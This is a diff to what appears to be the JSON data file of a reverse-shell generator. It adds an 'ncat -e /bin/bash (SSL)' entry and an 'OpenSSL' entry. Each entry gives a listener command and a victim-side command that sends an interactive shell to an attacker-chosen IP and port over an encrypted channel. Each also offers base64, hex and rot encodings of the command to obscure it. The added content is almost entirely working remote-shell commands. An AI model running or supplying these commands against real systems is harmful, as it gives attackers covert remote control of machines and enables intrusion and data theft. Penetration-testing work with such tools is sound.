@@ -145,6 +145,22 @@
         "note": "Test in Ubuntu 20.04.2"
     },
     {
+        "name": "ncat -e /bin/bash (SSL)",
+        "listener_cmd": "ncat -l ${values.port} --ssl -v",
+        "command": "ncat ${values.ip} ${values.port} --ssl -e /bin/bash -v",
+        "tags": [
+            "linux",
+            "mac",
+            "terminal"
+        ],
+        "oneliner": [
+            {"bash_b64": "command"},
+            {"bash_hex": "command"},
+            {"bash_rot": "command"}
+        ],
+        "note": "Test in Ubuntu 20.04.2"
+    },
+    {
         "name": "ncat.exe -e",
         "command": "ncat.exe ${values.ip} ${values.port} -e {shell}",
         "tags": [
@@ -190,6 +206,22 @@
             "mac",
             "code"
         ]
+    },
+    {
+        "name": "OpenSSL",
+        "listener_cmd": "openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes;openssl s_server -quiet -key key.pem -cert cert.pem -port ${values.port}",
+        "command": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${values.ip}:${values.port} > /tmp/s; rm /tmp/s",
+        "tags": [
+            "linux",
+            "mac",
+            "terminal"
+        ],
+        "oneliner": [
+            {"bash_b64": "command"},
+            {"bash_hex": "command"},
+            {"bash_rot": "command"}
+        ],
+        "note": "Test in Ubuntu 18.04.6"
     },
     {
         "name": "Perl",
